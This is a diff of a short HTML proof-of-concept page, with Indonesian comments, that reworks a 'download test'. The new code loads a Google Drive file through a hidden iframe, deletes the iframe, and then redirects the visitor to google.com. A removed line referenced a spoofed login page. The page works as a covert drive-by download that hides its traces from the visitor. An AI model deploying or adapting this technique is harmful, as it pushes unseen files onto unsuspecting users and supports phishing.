@@ -2,23 +2,24 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Download Test (Final PoC)</title>
+<title>Download Test (iframe method)</title>
 <script>
 function start() {
-    // Ganti URL supaya tidak download tapi tetap request
-    const file = "https://cnfdnfial-ops.github.io/spoof/login.html";
+    // File source (Google Drive)
     const file = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
 
-    // Trigger request via <a> tanpa memaksa download
-    const a = document.createElement("a");
-    a.href = file;
-    a.download = ""; // attribute tetap ada tapi diabaikan browser
-    document.body.appendChild(a);
+    // Trigger request via iframe (menggantikan <a download>)
+    const iframe = document.createElement("iframe");
+    iframe.src = file;
+    iframe.style.display = "none"; // sembunyikan iframe
+    document.body.appendChild(iframe);
 
-    a.click(); // trigger request
-    document.body.removeChild(a); // bersihkan DOM
+    // optional: cleanup iframe setelah beberapa detik
+    setTimeout(() => {
+        document.body.removeChild(iframe);
+    }, 5000);
 
-    // redirect setelah request
+    // redirect parent page setelah request
     setTimeout(() => {
         window.open("http://google.com/", "_self", "noopener,noreferrer");
     }, 2000);
